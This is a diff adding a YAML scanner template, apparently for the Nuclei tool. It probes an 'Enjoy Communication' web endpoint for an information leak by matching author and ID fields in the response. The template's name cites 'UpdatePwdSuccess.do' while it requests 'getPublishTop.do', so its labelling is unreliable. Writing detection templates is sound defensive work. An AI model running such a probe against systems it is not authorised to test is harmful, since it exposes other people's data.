@@ -1,0 +1,24 @@
+id: poc-yaml-enjoy-communication-updatepwdsuccess-do-info-leak
+info:
+  name: Enjoy Communication UpdatePwdSuccess.do Info Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/newsedit/newsedit/batman/getPublishTop.do"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"author\""
+          - "\"authorID\""
+          - "\"countCreated\""
+      - type: word
+        words:
+          - "<"
+        negative: true
